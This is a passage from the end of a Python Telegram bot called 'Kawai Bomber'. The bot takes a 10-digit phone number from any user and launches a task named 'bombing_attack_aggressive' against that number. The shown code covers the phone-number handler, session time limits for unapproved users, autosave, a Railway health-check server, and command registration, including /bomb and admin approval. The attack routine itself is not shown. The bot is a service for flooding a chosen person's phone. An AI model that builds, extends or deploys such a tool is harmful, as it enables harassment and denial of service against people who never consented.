        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            get_anime_banner(),
            reply_markup=reply_markup,
            parse_mode=ParseMode.MARKDOWN
        )

async def handle_phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle direct phone number messages"""
    user_id = update.effective_user.id
    
    if is_banned(user_id):
        return
    
    phone = update.message.text.strip()
    
    if not phone.isdigit() or len(phone) != 10:
        return
    
    if user_id in user_sessions:
        await update.message.reply_text(f"{ANIME_STYLES['warning']} 𝕐𝕠𝕦 𝕒𝕝𝕣𝕖𝕒𝕕𝕪 𝕙𝕒𝕧𝕖 𝕒𝕟 𝕒𝕔𝕥𝕚𝕧𝕖 𝕒𝕥𝕥𝕒𝕔𝕜! 𝕌𝕤𝕖 /𝕤𝕥𝕠𝕡 𝕗𝕚𝕣𝕤𝕥.")
        return
    
    # Start bombing attack
    task = asyncio.create_task(bombing_attack_aggressive(phone, user_id, update.effective_chat.id, context))
    user_sessions[user_id] = {
        "start_time": time.time(),
        "phone": phone,
        "task": task
    }
    global_stats["active_sessions"] += 1
    global_stats["total_bombs"] += 1

# ========== SESSION CLEANUP TASK ==========
async def cleanup_sessions():
    """Cleanup expired sessions periodically"""
    while True:
        try:
            current_time = time.time()
            expired_users = []
            
            for user_id, session in user_sessions.items():
                # Check if session expired (1 hour for non-approved users)
                if not is_approved(user_id) and current_time - session["start_time"] > 3600:
                    expired_users.append(user_id)
            
            # Cleanup expired sessions
            for user_id in expired_users:
                if user_id in user_sessions:
                    user_sessions[user_id]["task"].cancel()
                    try:
                        await user_sessions[user_id]["task"]
                    except asyncio.CancelledError:
                        pass
                    del user_sessions[user_id]
                    global_stats["active_sessions"] = max(0, global_stats["active_sessions"] - 1)
                    
                    # Notify user
                    try:
                        from telegram.error import TelegramError
                        await context.bot.send_message(
                            chat_id=user_id,
                            text=f"{ANIME_STYLES['clock']} *𝔸𝕥𝕥𝕒𝕔𝕜 𝕒𝕦𝕥𝕠-𝕤𝕥𝕠𝕡𝕡𝕖𝕕* {ANIME_STYLES['clock']}\n\n"
                                 "𝟙-𝕙𝕠𝕦𝕣 𝕥𝕚𝕞𝕖 𝕝𝕚𝕞𝕚𝕥 𝕣𝕖𝕒𝕔𝕙𝕖𝕕. 𝔾𝕖𝕥 𝕒𝕡𝕡𝕣𝕠𝕧𝕖𝕕 𝕗𝕠𝕣 𝕦𝕟𝕝𝕚𝕞𝕚𝕥𝕖𝕕 𝕥𝕚𝕞𝕖!",
                            parse_mode=ParseMode.MARKDOWN
                        )
                    except:
                        pass
            
            await asyncio.sleep(30)  # Check every 30 seconds
        except Exception as e:
            logger.error(f"Cleanup error: {e}")
            await asyncio.sleep(30)

# ========== AUTOSAVE TASK ==========
async def autosave_task():
    """Auto-save bot state periodically"""
    while True:
        try:
            save_state()
            logger.info("✅ Auto-save completed")
            await asyncio.sleep(300)  # Save every 5 minutes
        except Exception as e:
            logger.error(f"❌ Auto-save error: {e}")
            await asyncio.sleep(300)

# ========== SIGNAL HANDLERS ==========
def handle_shutdown(signum, frame):
    """Handle shutdown signals"""
    logger.info("🛑 Shutdown signal received. Saving state...")
    save_state()
    
    # Cancel all active sessions
    for user_id, session in user_sessions.items():
        session["task"].cancel()
    
    sys.exit(0)

# ========== RAILWAY HEALTH CHECK ==========
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/health':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            health_data = {
                "status": "healthy",
                "bot": "Kawai Bomber",
                "users": len(all_users),
                "active_sessions": global_stats["active_sessions"],
                "total_bombs": global_stats["total_bombs"],
                "environment": RAILWAY_ENVIRONMENT,
                "uptime": int(time.time() - global_stats["start_time"])
            }
            self.wfile.write(json.dumps(health_data).encode())
        elif self.path == '/':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            html = f"""
            <html>
            <head><title>Kawai Bomber Bot</title></head>
            <body style="font-family: Arial, sans-serif; text-align: center; padding: 50px;">
                <h1>🌸✨ Kawai Bomber Bot ✨🌸</h1>
                <p>Status: <strong>🟢 RUNNING</strong></p>
                <p>Users: {len(all_users):,}</p>
                <p>Active Sessions: {global_stats['active_sessions']}</p>
                <p>Environment: {RAILWAY_ENVIRONMENT}</p>
                <p>Made by: @zerocyph</p>
                <p>Powered by: @zerocyph</p>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        # Disable default logging
        pass

def start_health_server():
    """Start a simple HTTP server for Railway health checks"""
    try:
        server = HTTPServer(('0.0.0.0', 8080), HealthHandler)
        print(f"🏥 Health server started on port 8080")
        server.serve_forever()
    except Exception as e:
        print(f"⚠️ Health server error: {e}")

# ========== MAIN FUNCTION ==========
def main():
    """Start the bot - Railway optimized"""
    # Register shutdown handlers
    signal.signal(signal.SIGINT, handle_shutdown)
    signal.signal(signal.SIGTERM, handle_shutdown)
    atexit.register(save_state)
    
    # Load saved state
    load_state()
    
    # Start health server in background thread if on Railway
    if PORT or RAILWAY_ENVIRONMENT != 'production':
        health_thread = threading.Thread(target=start_health_server, daemon=True)
        health_thread.start()
        print(f"🚂 Railway Health Server: ACTIVE")
    
    # Create Application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("bomb", bomb_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("restart", restart_command))
    application.add_handler(CommandHandler("addadmin", addadmin_command))
    application.add_handler(CommandHandler("approve", approve_command))
    application.add_handler(CommandHandler("removeuser", removeuser_command))
    application.add_handler(CommandHandler("ban", ban_command))
    application.add_handler(CommandHandler("unban", unban_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("broadcast", broadcast_command))
    application.add_handler(CommandHandler("users", users_command))
    
    # Add callback handler
    application.add_handler(CallbackQueryHandler(button_callback))
    
    # Add message handler for phone numbers
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone_number))
    
    # Start the bot with enhanced polling
    print(f"\n{'='*60}")
    print(f"{get_anime_banner()}")
    print(f"{'='*60}")
    print(f"{ANIME_STYLES['rocket']} Kawai Bomber Bot")
    print(f"{ANIME_STYLES['crown']} Admin ID: {ADMIN_ID}")
    print(f"{ANIME_STYLES['star']} Made by: @zerocyph")
    print(f"{ANIME_STYLES['heart']} Powered by: @zerocyph")
    print(f"{ANIME_STYLES['shield']} Bot Token: {BOT_TOKEN[:10]}...")
    print(f"{ANIME_STYLES['fire']} Railway.app Pro Plan")
    print(f"{ANIME_STYLES['users']} Loaded Users: {len(all_users):,}")
    print(f"{ANIME_STYLES['clock']} Environment: {RAILWAY_ENVIRONMENT}")
    print(f"{'='*60}\n")
    
    # Start background tasks
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.create_task(cleanup_sessions())
    loop.create_task(autosave_task())
    
    # Run the bot
    application.run_polling(
        allowed_updates=Update.ALL_TYPES,
        poll_interval=0.1,  # Faster polling for better response
        timeout=30,
        drop_pending_updates=True,
        close_loop=False
    )

if __name__ == "__main__":
    main()
